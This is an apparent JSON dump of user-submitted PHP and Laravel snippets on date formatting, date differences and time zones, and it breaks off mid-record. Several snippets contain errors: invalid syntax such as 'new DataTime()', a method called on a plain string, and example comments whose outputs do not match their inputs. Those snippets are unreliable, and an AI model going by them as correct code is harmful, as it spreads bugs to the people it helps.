    "description": "date_default_timezone_set('Asia/Kolkata'); $timestamp = date(\"Y-m-d H:i:s\");\ndate_default_timezone_set('Asia/Kolkata'); \n<?php \tdate_default_timezone_set(\"Asia/Kolkata\");   //India time (GMT+5:30) \techo date('d-m-Y H:i:s'); ?>\n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 918,
    "keyword": null,
    "link": null,
    "title": " date diff php",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$datetime1 \t= new DateTime('2020-10-11 16:52:52'); $datetime2 \t= new DateTime('2020-10-13 16:52:52'); $interval \t= $datetime1->diff($datetime2);  echo $interval->format('%a days');\n$now = time(); // or your date as well $your_date = strtotime(\"2010-01-31\"); $datediff = $now - $your_date;  echo round($datediff / (60 * 60 * 24));\n$date1 = \"2007-03-24\"; $date2 = \"2009-06-26\";  $diff = abs(strtotime($date2) - strtotime($date1));  $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24));  printf(\"%d years, %d months, %d days\\n\", $years, $months, $days);\n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 919,
    "keyword": null,
    "link": null,
    "title": " date format change in laravel",
    "description": "date('d-m-Y', strtotime($user->from_date)); /** or **/ date_format($user->from_date,'D M Y')\n// $editData->hld_end_date ? date('d-m-Y',strtotime($editData->hld_end_date)) : null // bydefault null  date('d-m-Y',strtotime(str_replace('/', '-', $editData->hld_end_date) //bydefault value is null then 01-01-1970                         date_format(date_create($editData->hld_end_date),'d-m-Y') //bydefault value is null then Today date                         $editData->hld_end_date->format('d-m-Y') // null error                         \\Carbon\\Carbon::parse($editData->hld_end_date)->format('d/m/Y') //bydefault value is null then 01-01-1970 //$uj@y\n{{date_format($data->con_date_maintained,'D M Y')}}  {{ $data->con_wash_start_date == null ? date_format($data->con_date_maintained,'D M Y') : \"-\" }} //$uj@y\ndate('d-m-Y', strtotime($user->from_date)); \n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 920,
    "keyword": null,
    "link": null,
    "title": " date format change in laravel blade",
    "description": "date('d-m-Y', strtotime($user->from_date)); /** or **/ date_format($user->from_date,'D M Y')\n// $editData->hld_end_date ? date('d-m-Y',strtotime($editData->hld_end_date)) : null // bydefault null  date('d-m-Y',strtotime(str_replace('/', '-', $editData->hld_end_date) //bydefault value is null then 01-01-1970                         date_format(date_create($editData->hld_end_date),'d-m-Y') //bydefault value is null then Today date                         $editData->hld_end_date->format('d-m-Y') // null error                         \\Carbon\\Carbon::parse($editData->hld_end_date)->format('d/m/Y') //bydefault value is null then 01-01-1970 //$uj@y\n{{date_format($data->con_date_maintained,'D M Y')}}  {{ $data->con_wash_start_date == null ? date_format($data->con_date_maintained,'D M Y') : \"-\" }} //$uj@y\ndate('d-m-Y', strtotime($user->from_date)); \n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 921,
    "keyword": null,
    "link": null,
    "title": " date format in wordpress post",
    "description": "Posted on <?php the_time( 'l, F jS, Y' ); ?>.\n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 922,
    "keyword": null,
    "link": null,
    "title": " date format php",
    "description": "To convert the date-time format PHP provides strtotime() and date() function. We change the date format from one format to another.  Change YYYY-MM-DD to DD-MM-YYYY <? php. $currDate = \"2020-04-18\"; $changeDate = date(\"d-m-Y\", strtotime($currDate)); echo \"Changed date format is: \". $changeDate. \" (MM-DD-YYYY)\"; ?>\ndate('Y-m-d H:i:s')\n$currentYear=date(\"Y\");//2019\n$today = date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                           // 03.10.01 $today = date(\"j, n, Y\");                         // 10, 3, 2001 $today = date(\"Ymd\");                             // 20010310 $today = date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day (10&egrave;me jour du mois). $today = date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\e\\s\\t\\ \\l\\e\\ \\m\\o\\i\\s'); // 17:03:18 m est le mois $today = date(\"H:i:s\");                           // 17:16:18 $today = date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 (le format DATETIME de MySQL)\n<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n <?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone  $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>  \n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 923,
    "keyword": null,
    "link": null,
    "title": " date in php",
    "description": " <?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone  $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>  \n Things to be aware of when using week numbers with years.  <?php echo date(\"YW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"YW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"YW\", strtotime(\"2011-01-01\")); // gives 201152 too ?>  BUT  <?php echo date(\"oW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"oW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"oW\", strtotime(\"2011-01-01\")); // gives 201052 (Year is different than previous example) ?>  Reason: Y is year from the date o is ISO-8601 year number W is ISO-8601 week number of year  Conclusion: if using 'W' for the week number use 'o' for the year. \n FYI: there's a list of constants with predefined formats on the DateTime object, for example instead of outputting ISO 8601 dates with:  <?php echo date('c'); ?>  or  <?php echo date('Y-m-d\\TH:i:sO'); ?>  You can use  <?php echo date(DateTime::ISO8601); ?>  instead, which is much easier to read. \n <?php // set the default timezone to use. Available since PHP 5.1 date_default_timezone_set('UTC');   // Prints something like: Monday echo date(\"l\");  // Prints something like: Monday 8th of August 2005 03:12:46 PM echo date('l jS \\of F Y h:i:s A');  // Prints: July 1, 2000 is on a Saturday echo \"July 1, 2000 is on a \" . date(\"l\", mktime(0, 0, 0, 7, 1, 2000));  /* use the constants in the format parameter */ // prints something like: Wed, 25 Sep 2013 15:28:57 -0700 echo date(DATE_RFC2822);  // prints something like: 2000-07-01T00:00:00+00:00 echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000)); ?>  \n <?php // prints something like: Wednesday the 15th echo date('l \\t\\h\\e jS'); ?> gmdate() - Format a GMT/UTC date/time idate() - Format a local time/date as integer getdate() - Get date/time information getlastmod() - Gets time of last page modification mktime() - Get Unix timestamp for a date strftime() - Format a local time/date according to locale settings time() - Return current Unix timestamp DateTimeImmutable::__construct() - Returns new DateTimeImmutable object Predefined DateTime Constants \n<?php  // Prints the day, date, month, year, time, AM or PM $dollar = date(\"l jS \\of F Y\") . \"<br>\";  echo $dollar;  // Result Example :- Wednesday 18th of August 2021  ?> \n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 924,
    "keyword": null,
    "link": null,
    "title": " date now php",
    "description": "date('Y-m-d H:i:s')\ndate(\"Y-m-d H:i:s\"); \n// In my case I want to print to log my zone time (Rome GMT +2) // without changing the default timezone // Add +2 hours respect to php time $new_time = date(\"Y-m-d H:i:s\", strtotime('+2 hours'));\n// 1. create a date instance $date = new DateTime;  // 2. set the date using the setDate(year, month, date) method on the //    $date instance $date->setDate(1999,02,19);\n <?php // D&eacute;finit le fuseau horaire par d&eacute;faut &agrave; utiliser. Disponible depuis PHP 5.1 date_default_timezone_set('UTC');   // Affichage de quelque chose comme : Monday echo date(\"l\");  // Affichage de quelque chose comme : Monday 8th of August 2005 03:12:46 PM echo date('l jS \\of F Y h:i:s A');  // Affiche : July 1, 2000 is on a Saturday echo \"July 1, 2000 is on a \" . date(\"l\", mktime(0, 0, 0, 7, 1, 2000));  /* utilise les constantes dans le param&egrave;tre format */ // Affichage de quelque chose comme : Wed, 25 Sep 2013 15:28:57 -0700 echo date(DATE_RFC2822);  // Affichage de quelque chose comme : 2000-07-01T00:00:00+00:00 echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000)); ?>  \necho date('c');  // 2015-07-27T00:00:00+02:00 \n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 925,
    "keyword": null,
    "link": null,
    "title": " date php",
    "description": "date('Y-m-d H:i:s')\n$today = date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                           // 03.10.01 $today = date(\"j, n, Y\");                         // 10, 3, 2001 $today = date(\"Ymd\");                             // 20010310 $today = date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day (10&egrave;me jour du mois). $today = date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\e\\s\\t\\ \\l\\e\\ \\m\\o\\i\\s'); // 17:03:18 m est le mois $today = date(\"H:i:s\");                           // 17:16:18 $today = date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 (le format DATETIME de MySQL)\n<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\nDatetime nn=new DataTime();\n<?php echo date(\"F j, Y, g:i a\").\"<br>\";               // March 10, 2001, 5:16 pm echo date(\"m.d.y\").\"<br>\";                       // 03.10.01 echo date(\"j, n, Y\").\"<br>\";                     // 10, 3, 2001 echo date(\"Ymd\").\"<br>\";                         // 20010310 echo date('h-i-s, j-m-y, it is w Day').\"<br>\";   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.').\"<br>\"; // it is the 10th day. echo date(\"D M j G:i:s T Y\").\"<br>\";             // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h').\"<br>\";   // 17:03:18 m is month echo date(\"H:i:s\").\"<br>\";                       // 17:16:18 echo date(\"Y-m-d H:i:s\").\"<br>\";                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n",
    "reg_date": "2021-10-12T10:13:33.000Z"
  },
  {
    "id": 926,
    "keyword": null,
    "link": null,
    "title": " date time format php",
    "description": "<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\n<?php   \t$date = '05/05/2021'; \techo DateTime::createFromFormat(\"d/m/Y\", $date)->format('Y-m-d'); \t//2021-05-05 \n$originalDate = \"2017-03-08\"; $newDate = date(\"d/m/Y\", strtotime($originalDate)); \n$today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 927,
    "keyword": null,
    "link": null,
    "title": " date to string in php",
    "description": "$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>  \n$element = '15-Feb-2009'; $date = DateTime::createFromFormat('j-M-Y', $element);\necho date('Y.m.d H:i:s');\nDate to string  $date = \"2021/03/13\"; $newdate= date('d M, Y', strtotime($date)); echo $newdate;\n$date_string_prepared = date_create(\"2020-08-07\"); $date_string = $date_string_prepared->format(\"d M Y\"); // result 07 Jul 2020\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 928,
    "keyword": null,
    "link": null,
    "title": " date to string php",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = 